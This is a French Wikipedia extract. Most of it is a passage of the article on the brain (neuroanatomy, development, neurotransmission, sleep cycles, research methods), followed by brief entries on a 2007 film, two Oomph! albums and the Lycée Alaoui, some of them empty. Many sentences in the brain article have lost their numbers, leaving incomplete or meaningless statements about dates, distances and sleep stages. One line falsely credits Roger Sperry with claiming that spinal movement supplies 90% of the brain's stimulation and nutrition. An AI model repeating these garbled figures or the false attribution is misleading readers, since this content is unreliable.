sont étroitement jointes, formant la barrière hémato-encéphalique qui protège le cerveau en agissant comme un filtre vis-à-vis des toxines susceptibles d'être contenues dans le sang.
Les cerveaux des chordés possèdent la même forme sous-jacente, caractérisée par la manière dont le cerveau se développe. Pendant le neurodéveloppement, le système nerveux commence à se mettre en place par l'apparition d'une fine bande de tissu neural parcourant tout le dos de l'embryon. La bande s'épaissit ensuite et se plisse pour former le tube neural. C'est à l'extrémité avant du tube que se développe le cerveau, l'émergence de celui-ci chez les premiers chordés aquatiques étant en relation avec le développement de leur sens de l'olfaction lié à leurs capacités exploratrices à la recherche de proies. Au départ, le cerveau se manifeste comme trois gonflements qui représentent en fait le prosencéphale, le mésencéphale et le rhombencéphale. Chez de nombreux groupes de chordés, ces trois régions gardent la même taille chez l'adulte, mais le prosencéphale des mammifères devient plus important que les autres régions, le mésencéphale étant lui plus petit.
La corrélation entre la taille du cerveau et la taille de l'organisme ou d'autres facteurs a été étudiée sur un grand nombre d'espèces de chordés. La taille du cerveau augmente avec la taille de l'organisme, mais pas de manière proportionnelle. Chez les mammifères, la relation suit une loi de puissance, avec un exposant d'environ 0,75. Cette formule s'applique pour le cerveau moyen des mammifères mais chaque famille s'en démarque plus ou moins, reflétant la complexité de leur comportement. Ainsi, les primates ont un cerveau cinq à dix fois plus gros que ce qu’indique la formule. De manière générale, les prédateurs tendent à avoir des cerveaux plus gros. Quand le cerveau des mammifères augmente en taille, toutes les parties n'augmentent pas dans la même proportion. Plus le cerveau d'une espèce est gros, plus la fraction occupée par le cortex est importante, 80 % de l'activité cérébrale dépendant des signaux visuels chez les primates.
Régions du cerveau.
En neuroanatomie des chordés, le cerveau est généralement considéré comme constitué de cinq régions principales définies sur la base du développement du système nerveux à partir du tube neural : le télencéphale, le diencéphale, le mésencéphale, le cervelet, et le bulbe rachidien. Chacune de ces régions possède une structure interne complexe. Certaines régions du cerveau, comme le cortex cérébral ou le cervelet, sont formées de couches formant des replis sinueux, les circonvolutions cérébrales, qui permettent d'augmenter la surface corticale ou cérébelleuse tout en logeant dans la boîte crânienne. Les autres régions du cerveau représentent des groupes de nombreux noyaux. Si des distinctions claires peuvent être établies à partir de la structure neurale, la chimie et la connectivité, des milliers de régions distinctes peuvent être identifiées dans le cerveau des chordés.
Dans plusieurs branches des chordés, l'évolution a amené des changements importants sur l'architecture du cerveau. Les composants du cerveau des requins sont assemblés de façon simple et directe, mais chez les poissons téléostéens, groupe majoritaire des poissons modernes, le prosencéphale est devenu éverté. Le cerveau des oiseaux présente également d'importants changements. Un des principaux composants du prosencéphale des oiseaux, la crête ventriculaire dorsale, a longtemps été considéré comme l'équivalent du ganglion basal des mammifères, mais est maintenant considéré comme étroitement apparenté au néocortex.
De nombreuses régions du cerveau ont gardé les mêmes propriétés chez tous les chordés. Le rôle de la plupart de ces régions est encore soumis à la discussion mais il est malgré tout possible de dresser une liste des régions principales du cerveau et le rôle qu'on leur attribue selon les connaissances actuelles :
Mammifères.
Le cortex cérébral est la région du cerveau qui distingue au mieux le cerveau des mammifères de celui des autres vertébrés, celui des primates de celui des autres mammifères, et celui des humains de celui des autres primates. Le rhombencéphale et le mésencéphale des mammifères est généralement similaire à celui des autres vertébrés, mais des différences très importantes se manifestent au niveau du prosencéphale qui n'est pas seulement beaucoup plus gros mais présente également des modifications dans sa structure. Chez les autres chordés, la surface du télencéphale est recouverte d'une simple couche, le pallium. Chez les mammifères, le pallium a évolué en une couche à six feuillets appelée néocortex. Chez les primates, le néocortex s'est grandement élargi, notamment au niveau de la région des lobes frontaux. L'hippocampe des mammifères a également une structure bien particulière.
L'histoire évolutive de ces particularités mammaliennes, notamment le néocortex, est difficile à retracer. Les synapsides, ancêtres des mammifères, se sont séparés des sauropsides, ancêtres des reptiles actuels et des oiseaux, il y a environ d'années. Ensuite, il y a d'années, les mammifères se sont ramifiés en monotrèmes, marsupiaux et placentaires, division qui a abouti aux représentants actuels. Le cerveau des monotrèmes et des marsupiaux se distingue de celui des placentaires (groupe majoritaire des mammifères actuels) à différents niveaux, mais la structure de leur cortex cérébral et de leur hippocampe est la même. Ces structures ont donc probablement évolué entre -350 et d'années, une période qui ne peut être étudiée qu'à travers les fossiles mais ceux-ci ne préservent pas les tissus mous comme le cerveau.
Primates.
Le cerveau des primates possède la même structure que celui des autres mammifères, mais il est considérablement plus large proportionnellement à la taille de l'organisme. Cet élargissement provient essentiellement de l'expansion massive du cortex, notamment au niveau des régions servant à la vision et à la prévoyance. Le processus de perception visuelle chez les Primates est très complexe, faisant intervenir au moins trente zones distinctes et un important réseau d'interconnexions, et occupe plus de la moitié du néocortex. L'élargissement du cerveau provient également de l'élargissement du cortex préfrontal dont les fonctions sont difficilement résumables mais portent sur la planification, la mémoire de travail, la motivation, l'attention, et les fonctions exécutives.
Chez les humains, l'élargissement des lobes frontaux est encore plus extrême, et d'autres parties du cortex sont également devenues plus larges et complexes.
Histologie.
Le tissu cérébral est composé de deux types de cellules, les neurones et les cellules gliales. Les neurones jouent un rôle prépondérant dans le traitement de l'information nerveuse tandis que les cellules gliales, ou cellules de soutien, assurent diverses fonctions annexes dont le métabolisme cérébral. Bien que ces deux types de cellules soient en même quantité dans le cerveau, les cellules gliales sont quatre fois plus nombreuses que les neurones dans le cortex cérébral. 
Contrairement aux cellules gliales, les neurones sont capables de communiquer entre eux à travers de longues distances. Cette communication se fait par des signaux envoyés par le biais de l'axone, prolongement protoplasmique du neurone qui s'étend depuis le corps cellulaire, se ramifie et se projette, parfois vers des zones proches, parfois vers des régions plus éloignées du cerveau ou du corps. Le prolongement de l'axone peut être considérable chez certains neurones. Les signaux transmis par l'axone se font sous forme d'influx électrochimiques, appelés potentiels d'action, qui durent moins d'un millième de seconde et traversent l'axone à une vitesse de . Certains neurones émettent en permanence des potentiels d'action, de 10 à 100 par seconde, d'autres n'émettent des potentiels d'action qu'occasionnellement.
Le point de jonction entre l'axone d'un neurone et un autre neurone, ou une cellule non-neuronale, est la synapse où le signal est transmis. Un axone peut avoir jusqu'à plusieurs milliers de terminaisons synaptiques. Lorsque le potentiel d'action, après avoir parcouru l'axone, parvient à la synapse, cela provoque la libération d'un agent chimique appelé neurotransmetteur. Une fois libéré, le neurotransmetteur se lie aux récepteurs membranaires de la cellule cible. Certains récepteurs neuronaux sont excitateurs, c'est-à-dire qu'ils augmentent la fréquence de potentiel d'action au sein de la cellule cible ; d'autres récepteurs sont inhibiteurs et diminuent la fréquence de potentiel d'action ; d'autres ont des effets modulatoires complexes.
Les axones occupent la majeure partie de l'espace cérébral. Les axones sont souvent regroupés en larges groupes pour former des faisceaux de fibres nerveuses. De nombreux axones sont enveloppés d'une gaine de myéline, une substance qui permet d'augmenter fortement la vitesse de propagation du potentiel d'action. La myéline est de couleur blanche, de telle sorte que les régions du cerveau essentiellement occupées par ces fibres nerveuses apparaissent comme de la substance blanche tandis que les zones densément peuplées par les corps cellulaires des neurones apparaissent comme de la substance grise. La longueur totale des axones myélinisés dans le cerveau adulte d'un humain dépasse en moyenne les kilomètres.
Métabolisme.
Selon le prix Nobel Roger Sperry, 90 % de la stimulation et de la nutrition du cerveau sont générés par les mouvements de la colonne vertébrale.
Développement.
Le développement du cerveau suit une succession d'étapes. Beaucoup de neurones naissent dans des zones spécifiques contenant des cellules souches et migrent ensuite à travers le tissu pour atteindre leur destination ultime. Ainsi, dans le cortex, la première étape du développement est la mise en place d'une armature par un type de cellules gliales, les cellules radiales, qui établissent des fibres verticales à travers le cortex. Les nouveaux neurones corticaux sont créés à la base du cortex et « grimpent » ensuite le long des fibres radiales jusqu'à atteindre les couches qu'ils sont destinés à occuper.
Chez les chordés, les premières étapes du développement sont communes à toutes les espèces. Tandis que l'embryon passe d'une forme ronde à une structure de type vermiforme, une étroite bande de l'ectoderme se décolle de la ligne médiane dorsale pour devenir la plaque neurale, précurseur du système nerveux. La plaque neurale se creuse, s'invagine de manière à former la gouttière neurale puis, les plis neuraux qui bordent la gouttière fusionnent pour fermer la gouttière qui devient le tube neural. Ce tube se subdivise ensuite en une partie antérieure renflée, la vésicule céphalique primitive, qui se segmente en trois vésicules qui deviendront le prosencéphale, le mésencéphale, et le rhombencéphale. Le prosencéphale se divise ensuite en deux autres vésicules, le télencéphale et le diencéphale tandis que le rhombencéphale se divise en métencéphale et myélencéphale. Chacune de ces vésicules contient des zones prolifératives dans lesquelles neurones et cellules gliales sont formés. Ces deux types de cellules migrent ensuite, parfois sur de longues distances, vers leurs positions finales.
Une fois qu'ils sont en place, les neurones commencent à étendre leurs dendrites et leur axone autour d'eux. L'axone doit généralement s'étendre sur une longue distance à partir du corps cellulaire du neurone et doit se connecter sur des cibles bien spécifiques, ce qui lui nécessite de croître d'une manière plus complexe. À l'extrémité de l'axone en développement se trouve une région parsemée de récepteurs chimiques, le cône de croissance. Ces récepteurs recherchent des signaux moléculaires dans l'environnement alentour qui guident la croissance de l'axone en attirant ou en repoussant le cône de croissance et dirigent ainsi l'étirement de l'axone dans une direction donnée. Le cône de croissance navigue ainsi à travers le cerveau jusqu'à ce qu'il atteigne sa région de destination, où d'autres signaux chimiques engendrent la formation de synapses. Des milliers de gènes interviennent pour générer ces signaux de guidage mais le réseau synaptique qui en émerge n'est déterminé qu'en partie par les gènes. Dans de nombreuses parties du cerveau, les axones connaissent d'abord une surcroissance proliférative qui est ensuite régulée par des mécanismes dépendants de l'activité neuronale. Ce processus sophistiqué de sélection et d'ajustement graduel aboutit finalement à la forme adulte du réseau neuronal.
Chez les mammifères les neurones sont produits avant la naissance (principalement entre la et la gestationnelle chez l'humain). Le cerveau du nouveau-né contient donc substantiellement plus de neurones que celui de l'adulte car au cours du développement puis encore pendant le vieillissement, un grand nombre de ces cellules vont être détruites. La disparition des cellules nerveuses correspond à un phénomène nécessaire de sélection/stabilisation dans les réseaux de neurones au cours de la mise en place de circuits cérébraux.
Cependant quelques zones continuent de générer de nouveaux neurones tout au long de la vie, telles que le bulbe olfactif ou le "gyrus dentatus" de l'hippocampe. En dehors de ces exceptions, le nombre de neurones présents à la naissance est définitif, contrairement aux cellules gliales qui sont renouvelées tout au long de la vie, à la manière de la plupart des cellules de l'organisme. Bien que le nombre de neurones évolue peu après la naissance, les connexions axonales continuent de se développer et de s'organiser pendant encore un long moment. Chez l'humain ce processus n'est pas terminé avant l'adolescence et il continue de se poursuivre avec l'acquisition de nouveaux apprentissages.
De nombreuses questions restent en suspens concernant ce qui relève de l'inné et de l'acquis à propos de l'esprit, de l'intelligence et de la personnalité. Bien que de nombreux points restent à éclaircir, les neurosciences ont montré que deux facteurs sont essentiels. D'un côté, les gènes déterminent la forme générale du cerveau, et la manière dont le cerveau répond à l'expérience. D'un autre côté, l'expérience est nécessaire pour affiner la matrice de connexions synaptiques. À bien des égards, la qualité et la quantité d'expériences joue un rôle. L’enrichissement environnemental montre que le cerveau d'un animal placé dans un environnement plus riche et stimulant a un nombre plus important de synapses que celui d'un animal dans un milieu plus pauvre.
Fonctions.
La fonction principale du cerveau est de contrôler les actions de l'organisme à partir des informations sensorielles qui lui parviennent. Les signaux sensoriels peuvent stimuler une réponse immédiate, moduler un schéma d'activité en cours, ou être emmagasinés pour un besoin futur. Ainsi, par le rôle central qu'il exerce dans la captation des stimuli externes, le cerveau occupe le rôle central dans la création de réponses à l'environnement. Le cerveau a aussi un rôle dans la régulation hormonale.
Le cerveau des chordés reçoit des signaux par les nerfs afférents de la part des différentes régions de l'organisme. Le cerveau interprète ces signaux et en tire une réponse fondée sur l'intégration des signaux électriques reçus, puis la transmet. Ce jeu de réception, d'intégration, et d'émission de signaux représente la fonction majeure du cerveau, qui explique à la fois les sensations, le mouvement, la mémoire et, on le suppose, la conscience.
Pour mener à bien sa complexe tâche, le cerveau est organisé en sous-systèmes fonctionnels, c'est-à-dire que certaines régions cérébrales traitent plus spécifiquement certains aspects de l'information. Cette division fonctionnelle n'est pas stricte et ces sous-systèmes peuvent être catégorisés de plusieurs façons : anatomiquement, chimiquement ou fonctionnellement. Une de ces catégorisations repose sur les neurotransmetteurs chimiques utilisés par les neurones pour communiquer. Une autre se base sur la manière dont chaque zone du cerveau contribue au traitement de l'information : les zones sensorielles amènent l'information au cerveau ; les signaux moteurs envoient l'information du cerveau jusqu'aux muscles et aux glandes ; les systèmes excitateurs modulent l'activité du cerveau en fonction du moment de la journée et de divers facteurs.
Le cerveau utilise principalement le glucose comme substrat énergétique et une perte de conscience peut survenir s'il en manque. La consommation énergétique du cerveau n'est pas particulièrement variable, mais les régions actives du cortex consomment plus d'énergie que les inactives.
Systèmes de neurotransmissions.
Selon le principe de Dale, chaque neurone du cerveau libère constamment le même neurotransmetteur chimique, ou la même combinaison de neurotransmetteurs, pour toutes les connexions synaptiques qu'il entretient avec d'autres neurones. Un neurone peut donc être caractérisé en fonction des neurotransmetteurs qu'il libère bien qu'il existe quelques exceptions à ce principe. Les deux neurotransmetteurs les plus fréquents sont le glutamate, qui correspond généralement à un signal excitatoire, et l'acide γ-aminobutyrique (GABA), généralement inhibitoire. Les neurones utilisant ces deux neurotransmetteurs se retrouvent dans presque toutes les régions du cerveau et forment un large pourcentage des synapses du cerveau.
Les autres neurotransmetteurs, comme la sérotonine ou la noradrénaline, proviennent de neurones localisés dans des zones particulières du cerveau. D'autres neurotransmetteurs, comme l'acétylcholine ou la dopamine, proviennent de plusieurs endroits du cerveau, mais ne sont pas distribués de façon aussi ubiquitaire que le glutamate et le GABA. La grande majorité des drogues psychotropes agissent en altérant les systèmes de neurotransmetteurs qui ne sont pas directement impliqués dans les transmissions glutamatergiques ou GABAergiques.
Systèmes sensoriels.
Une fonction importante du cerveau est de traiter l'information reçue par les récepteurs sensoriels. Contrairement aux idées reçues, les sens que peut capter le cerveau ne sont pas limitées à cinq. Outre la vue, l'ouïe, le toucher, l'odorat, et le goût, le cerveau peut recevoir d'autres informations sensorielles comme la température, l'équilibre, la position des membres, ou la composition chimique du sang. Toutes ces variables sont détectées par des récepteurs spécialisés qui transmettent les signaux vers le cerveau. Certaines espèces peuvent détecter des sens supplémentaires, comme la vision infrarouge des serpents, ou utiliser les sens « standards » de manière non conventionnelle, comme l'écholocation du système auditif des chauves-souris.
Chaque système sensoriel possède ses propres cellules sensorielles réceptrices. Ces cellules sont des neurones mais, contrairement à la majorité des neurones, ceux-ci ne sont pas contrôlés par les signaux synaptiques d'autres neurones. Au lieu de cela, ces cellules sensorielles possèdent des récepteurs membranaires qui sont stimulées par un facteur physique spécifique comme la lumière, la température, ou la pression. Les signaux de ces cellules sensorielles réceptrices parviennent jusqu'à la moelle épinière ou le cerveau par les nerfs afférents.
Pour la plupart des sens, il y a un noyau sensitif principal dans le tronc cérébral, ou un ensemble de noyaux, qui reçoit et réunit les signaux des cellules sensorielles réceptrices. Dans de nombreux cas, des zones secondaires sous-corticales se chargent d'extraire et de trier l'information. Chaque système sensoriel a également une région du thalamus qui lui est dédié et qui relaie l'information au cortex.
Pour chaque système sensoriel, une zone corticale primaire reçoit directement les signaux en provenance du relai thalamique. Habituellement, un groupe spécifique de zones corticales supérieures analyse également le signal sensoriel. Enfin, des zones multimodales du cortex combinent les signaux en provenance de différents systèmes sensoriels. À ce niveau, les signaux qui atteignent ces régions du cerveau sont considérés comme des signaux intégrés plutôt que comme des signaux strictement sensoriels.
Toutes ces étapes ont leurs exceptions. Ainsi, pour le toucher, les signaux sensoriels sont principalement reçus au niveau de la moelle épinière, au niveau de neurones qui projettent ensuite l'information au tronc cérébral. Pour l'odorat, il n'y a pas de relai dans le thalamus, le signal est transmis directement de la zone primaire, le bulbe olfactif, vers le cortex.
Systèmes moteurs.
Les systèmes moteurs sont les zones du cerveau responsables directement ou indirectement des mouvements du corps, en agissant sur les muscles. À l'exception des muscles contrôlant les yeux, tous les muscles squelettiques de l'organisme sont directement innervés par des neurones moteurs de la moelle épinière. Ils sont donc le dernier maillon de la chaîne du système psychomoteur. Les neurones moteurs spinaux sont contrôlés à la fois par des circuits neuronaux propres à la moelle épinière, et par des influx efférents du cerveau. Les circuits spinaux intrinsèques hébergent plusieurs réactions réflexes, ainsi que certains schémas de mouvements comme les mouvements rythmiques tels que la marche ou la nage. Les connexions efférentes du cerveau permettent quant à elles, des contrôles plus sophistiqués.
Un certain nombre de zones du cerveau sont connectées directement à la moelle épinière. Au niveau le plus bas se trouvent les zones motrices situées dans le bulbe rachidien et le pont. Au-dessus se situent les zones du mésencéphale, comme le noyau rouge, qui sont responsables de la coordination des mouvements. À un niveau supérieur se trouve le cortex moteur primaire, une bande de tissu cérébral localisée à la lisière postérieure du lobe frontal. Le cortex moteur primaire transmet ses commandes motrices aux zones motrices sous-corticales, mais également directement à la moelle épinière par le biais du faisceau pyramidal. Les influx nerveux de ce faisceau cortico-spinal transmettent les mouvements fins volontaires. D'autres zones motrices du cerveau ne sont pas directement reliées à la moelle épinière, mais agissent sur les zones motrices primaires corticales ou sous-corticales. Quelques-unes de ces zones secondaires les plus importantes sont le cortex prémoteur, impliqués dans la coordination des mouvements de différentes parties du corps, les ganglions de la base, dont la fonction principale semble être la sélection de l'action, et le cervelet, qui module et optimise les informations pour rendre les mouvements plus précis.
Le cerveau et la moelle épinière contiennent également un réseau neuronal qui contrôle le système nerveux autonome, la partie du système nerveux responsable des fonctions automatiques. Non soumis au contrôle volontaire, le système nerveux autonome contrôle notamment la régulation hormonale et l'activité des muscles lisses et du muscle cardiaque. Le système nerveux autonome agit à différents niveaux comme le rythme cardiaque, la digestion, la respiration, la salivation, la miction, la sueur ou l'excitation sexuelle.
Systèmes d'éveil.
Un des aspects les plus visibles du comportement animal est le cycle journalier veille-sommeil-rêve. L'éveil et l'attention sont aussi modulés à une échelle de temps plus fine, par un réseau de zones cérébrales.
Un composant clé du système d'éveil est le noyau suprachiasmatique, petite région de l'hypothalamus localisée directement au-dessus du point de croisement des nerfs optiques. Le noyau suprachiasmatique renferme l'horloge biologique centrale de l'organisme. Les neurones de ce noyau montrent un niveau d'activité qui augmente ou diminue sur une période d'environ , le rythme circadien : cette activité fluctuante est dirigée par des changements rythmiques exprimés par un groupe de gènes horlogers. Le noyau suprachiasmatique reçoit généralement des signaux en provenance des nerfs optiques qui permettent de calibrer l'horloge biologique à partir des cycles jour-nuit.
Le noyau suprachiasmatique se projette dans un ensemble de zones cérébrales (situées au niveau de l'hypothalamus et du tronc cérébral) qui sont impliqués dans la mise en œuvre des cycles jour-nuit. Un composant important du système est la formation réticulée, un groupe d'amas neuronaux s'étendant dans le tronc cérébral. Les neurones réticulés envoient des signaux vers le thalamus, qui répond en envoyant des signaux à différentes régions du cortex qui régule le niveau d'activité.
Le sommeil implique de profondes modifications dans l'activité cérébrale. Le cerveau ne s'éteint pas pendant le sommeil, l'activité cérébrale se poursuit mais est modifiée. En fait, il existe deux types de sommeil : le sommeil paradoxal (avec rêves) et le sommeil non paradoxal (généralement sans rêves). Ces deux sommeils se répètent selon un schéma légèrement différent à chaque sommeil. Trois grands types de schéma d'activité cérébrale peuvent être distingués : sommeil paradoxal, sommeil léger, et sommeil profond. Pendant le sommeil profond, l'activité du cortex prend la forme de larges ondes synchronisées tandis que ces ondes sont désynchronisées pendant l'état de rêve. Les niveaux de noradrénaline et de sérotonine tombent au cours du sommeil profond, et approchent du niveau zéro pendant le sommeil paradoxal, tandis que les niveaux d'acétylcholine présentent un schéma inverse.
Le cycle du sommeil se divise en cinq stades. Au , le sommeil lent apparaît lorsque l'on s'allonge et ferme les yeux, des rêves courts ou de brèves pensées sont parfois rapportés durant ce stade qui dure de 3 à . La seconde phase du sommeil lent est un sommeil léger, c'est la phase la plus longue occupant près de 50 % du temps de sommeil d'une nuit. Le est le passage du sommeil moyennement profond à profond, les muscles ont encore du tonus mais on est très peu réactif aux stimulations extérieures. Au , nous sommes au plus profond de notre sommeil, l'activité neuronale est à son plus bas, la température du cerveau est également basse, la respiration, le rythme cardiaque et la pression sanguine sont ralentis. Le est le dernier, le sommeil est paradoxal, l'activité électrique du cerveau est très importante, les yeux bougent rapidement, bien que le reste du corps se trouve en état d'atonie musculaire. Un cycle du sommeil dure de 70 à et se reproduit 4 à en une nuit.
Histoire de la découverte du cerveau.
Jean-Didier Vincent dresse une histoire et relie celle-ci avec les résultats des travaux de recherche.
Cerveau et esprit.
La compréhension de la relation entre le cerveau et l'esprit est un problème aussi bien scientifique que philosophique. La relation forte entre la matière cérébrale physique et l'esprit est aisément mise en évidence par l'impact que les altérations physiques du cerveau ont sur l'esprit, comme le traumatisme crânien ou l'usage de psychotrope.
Jusqu'à la fin du , le problème corps-esprit était l'un des débats centraux de l'histoire de la philosophie et consistait à considérer la manière dont le cerveau et l'esprit pouvaient être reliés.
Trois grands courants de pensée existaient concernant cette question : dualisme, matérialisme, et idéalisme :
Outre ces questions philosophiques, cette hypothèse de relation entre l'esprit et le cerveau soulevait un grand nombre de questions scientifiques, comme la relation entre l'activité mentale et l'activité cérébrale, le mécanisme d'action des drogues sur la cognition, ou encore la corrélation entre neurones et conscience.
Historiquement, un grand nombre de philosophes considéraient inconcevable que la cognition puisse être mise en place par une substance physique comme le tissu cérébral. Des philosophes comme Patricia Churchland ont postulé que l'interaction entre la drogue et l'esprit est un indicateur de la relation intime entre le cerveau et l'esprit mais que les deux entités sont distinctes.
Depuis l'avènement des neurosciences, et les travaux de nombreuses équipes internationales de recherche, cette question n'est plus d'actualité en sciences.
Antonio Damasio, dans son livre "L'Erreur de Descartes" notamment, montre que le corps et l'esprit fonctionnent de manière indissociable. Il explique par ailleurs que le raisonnement, la mémorisation, l'acquisition de nouveaux apprentissages ne peuvent pas s'effectuer sans intégrer les émotions dans les processus.
Recherche scientifique.
Le domaine des neurosciences englobe toutes les approches cherchant à comprendre le fonctionnement du cerveau et du reste du système nerveux. La psychologie cherche à comprendre l'esprit et le comportement. La neurologie est la discipline médicale qui diagnostique et traite les pathologies liées au système nerveux. Le cerveau est également l'organe le plus étudié en psychiatrie, une branche de la médecine qui étudie et traite les troubles mentaux. Les sciences cognitives tentent de lier la neuroscience et la psychologie avec d'autres domaines comme l'informatique et la philosophie.
La plus ancienne méthode d'étude du cerveau est l'anatomie. Au milieu du , les progrès des neurosciences proviennent de l'amélioration des techniques de microscopie et de coloration. Les neuroanatomistes étudient la structure du cerveau aussi bien à grande échelle qu'à l'échelle microscopique. Parmi d'autres outils, ils emploient une large gamme de colorants qui permettent de révéler la structure neurale, les réactions chimiques, et la connectivité. Le développement plus récent de techniques d'immunocoloration a permis de colorer les neurones qui exprime spécifiquement un groupe de gènes. Également, la neuroanatomie fonctionnelle utilise les techniques d'imagerie médicale pour corréler les variations dans la structure du cerveau avec les changements de cognition ou de comportement.
Les neurophysiologistes étudient les propriétés chimiques, pharmacologiques et électriques du cerveau. Leurs principaux outils sont les drogues et les dispositifs d'enregistrement. Des milliers de drogues expérimentalement développées affectent le système nerveux, plusieurs le font de manière très spécifique. L'enregistrement de l'activité cérébrale peut se faire par l'utilisation d'électrodes, soit collées au crâne comme dans le cas d'électro-encéphalographie, soit implantées à l'intérieur du cerveau pour des enregistrements extracellulaires, qui peuvent détecter les potentiels d'action générés par des neurones individuels. Comme le cerveau ne contient pas de nocicepteurs, il est possible d'utiliser ces techniques sur un animal éveillé sans causer de douleur. Il est aussi possible d'étudier l'activité cérébrale par un examen non invasif en utilisant des techniques d'imagerie fonctionnelle comme l'IRM. Ainsi la tomographie à émission de positons met en évidence qu'en l'absence de toute focalisation particulière de l'attention, l'activité du cerveau (activité intrinsèque du réseau du mode par défaut, nommée « énergie sombre du cerveau » par analogie à l'énergie sombre du cosmos et qui consiste en des vagues d'ondes électriques lentes) correspond à une dépense de 60 à 80 % de toute l'énergie consommée par le cerveau, soit une énergie supérieure à celle consommée par le cerveau lorsqu'il réagit consciemment, la réalisation d'une tâche particulière (activité consciente moins fréquente que l'activité inconsciente) exige une énergie qui n'excède pas 5 % de celle consommée par l'activité de fond.
Une autre approche est d'examiner les conséquences de l'endommagement de zones spécifiques du cerveau. Bien que protégé par le crâne et les méninges, et isolé du flux sanguin par la barrière hémato-encéphalique, le cerveau est tout de même vulnérable à de nombreuses maladies et à différents types de dégâts. Chez les humains, les effets des dégâts cérébraux sont une source importante d'informations sur la fonction cérébrale. Comme il n'y a pas la capacité de contrôler expérimentalement la nature de ces dégâts, cette information est néanmoins souvent difficile à interpréter. Chez les animaux, les rats étant les plus fréquents sujets d'étude, il est possible d'utiliser des électrodes ou d'injecter localement des produits chimiques pour produire des types de dégâts bien précis et observer ensuite leurs conséquences sur le comportement.
Les neurosciences computationnelles regroupent deux approches : l'utilisation d'ordinateurs pour comprendre le cerveau et l'étude de la façon dont le cerveau réalise la computation. D'un côté, il est possible de coder un programme informatique pour permettre de simuler le fonctionnement d'un groupe de neurones en utilisant des systèmes d'équations décrivant l'activité électrochimique ; ces simulations sont appelées « réseaux de neurones biologiquement réalistes ». D'un autre côté, il est possible d'étudier les algorithmes de computation neurale par la simulation ou l'analyse mathématique d'« unités » simplifiées ayant plusieurs des caractéristiques des neurones mais en faisant abstraction de la plupart de leur complexité biologique. Les fonctions computationnelles du cerveau sont étudiés à la fois par les neuroscientifiques et les informaticiens.
Les dernières années ont vu les premières applications des techniques d'ingénierie génétique pour l'étude du cerveau. Les sujets d'études les plus fréquents sont les souris, car c'est sur cette espèce que les outils techniques à disposition sont le plus au point. Il est désormais possible d'inactiver ou de muter une grande variété de gènes, et ensuite examiner les effets sur la fonction cérébrale. Des approches plus sophistiquées sont également utilisées, comme la recombinaison Cre-Lox qui permet d'activer ou d'inactiver les gènes dans des zones spécifiques du cerveau à des moments spécifiques.
Des équipes américaines, bénéficiant d'un financement fédéral de d'euros, utilisent des scanners dernier cri pour créer une banque de « connectomes ». Ces cartes des circuits cérébraux promettent de révéler comment les organes réagissent au vieillissement, à l'apprentissage et à d'autres événements. Les données du Human Connectome Project laisseraient présager des avancées sur les traitements de l'autisme et de la schizophrénie.
La question se pose actuellement de savoir si une Intelligence artificielle est réellement capable de fonctionner plus vite que les neurones et les synapses du cerveau humain.

</doc>
<doc id="3216506" url="https://fr.wikipedia.org/wiki?curid=3216506" title="Le Tueur (film, 2007)">
Le Tueur (film, 2007)

Le Tueur est un film français réalisé par Cédric Anger, sorti en 2007.
Synopsis.
Paris, veille de Noël. Léo Zimmerman est un homme d’affaires qui ne jure que par le sourire de sa fille qu’il chérit par-dessus tout. En apparence, sa vie est exemplaire. Pourtant, lorsque Dimitri Kopas débarque dans son bureau en se faisant passer pour un client ordinaire, Léo comprend qu’un contrat a été passé sur sa tête et que le jeune homme est là pour l’exécuter. Dévoré par l’angoisse et la paranoïa, ne dormant plus, Léo décide de venir à la rencontre du tueur et lui propose un étrange marché.
Accueil.
Le film a reçu un accueil positif de la presse et obtient un score moyen de 3,2/5 sur Allociné. Antoine Thirion pour les "Cahiers du cinéma" estime que « La grande force du film découle de la précision documentaire qui sous-tend la réutilisation des archétypes du polar ». Isabelle Regnier pour "Le Monde" évoque un film « plein d'humour [...] servi par la belle photographie de Caroline Champetier ».

</doc>
<doc id="3216519" url="https://fr.wikipedia.org/wiki?curid=3216519" title="Diários De Motocicleta">
Diários De Motocicleta



</doc>
<doc id="3216554" url="https://fr.wikipedia.org/wiki?curid=3216554" title="Schreiner">
Schreiner



</doc>
<doc id="3216617" url="https://fr.wikipedia.org/wiki?curid=3216617" title="Sperm">
Sperm

Sperm est le deuxième album du groupe allemand Oomph!. Il est sorti le et est reconnu comme étant à l'origine du genre musical Neue Deutsche Härte.
En comparaison du premier album, les guitares sont bien plus présentes et le ton est plus agressif.

</doc>
<doc id="3216636" url="https://fr.wikipedia.org/wiki?curid=3216636" title="Unrein">
Unrein

Unrein est le cinquième album du groupe allemand Oomph!. Il est sorti le .

</doc>
<doc id="3216688" url="https://fr.wikipedia.org/wiki?curid=3216688" title="Le fils de Sinbad 1955">
Le fils de Sinbad 1955



</doc>
<doc id="3216708" url="https://fr.wikipedia.org/wiki?curid=3216708" title="Lycée Alaoui">
Lycée Alaoui

Le lycée Alaoui () est un établissement d'enseignement secondaire tunisien, fondé le à Tunis, capitale de la Tunisie, à l'initiative d'Ali III Bey. Issu d'une réorganisation du collège Alaoui, c'est l'un des plus anciens lycées de la ville. Il a largement contribué à la formation des élites de la Tunisie moderne.
Le bâtiment actuel est inauguré en 1909 au numéro 2 de la rue d'Arles, devenue rue Tahar-Haddad.
Histoire.
L'origine du lycée remonte à la fondation du collège Alaoui, sous le règne et en présence d'Ali III Bey dont il porte le nom. Cet établissement est initialement logé dans un bâtiment construit en 1860 sur l'emplacement de la médersa du cheikh Ben Mlouka dans le sud-ouest de Tunis, à proximité de la porte El Gorjani. Situé sur la colline du même nom, à proximité de la caserne du de zouaves (future caserne Saussier), et jouissant d'une belle vue sur le faubourg de Bab El Jazira, il regroupe l'École normale primaire destinée à former des instituteurs et une école dite « école annexe » assurant l'enseignement primaire de garçons. Ces deux établissements, qui comptent 530 élèves en 1901 (dont 118 à l'école normale et 412 à l'école annexe) sont maintenues dans leurs locaux quand, en 1909, les classes d'enseignement primaire supérieur (futur lycée Alaoui) déménagent dans les nouveaux bâtiments de la rue d'Arles.
Une Association amicale des anciens élèves du collège Alaoui, fondée dès 1892 et dont la première assemblée générale s'est tenu le , a peu à peu vu ses activités décliner. Elle est réanimée en 1975 par des élèves du lycée Aloui sous la désignation d'.
Lycée.
Le lycée occupe un espace de . Classé monument historique par le décret n°92-1815 du , l'édifice est constitué d'un sous-sol, d'un rez-de-chaussée et d'un premier étage surélevé en partie en deuxième étage. Il comprend également trois cours principales donnant sur les salles de classe et les bureaux de l'administration.

</doc>
<doc id="3216710" url="https://fr.wikipedia.org/wiki?curid=3216710" title="Bella Ouellette">
Bella Ouellette

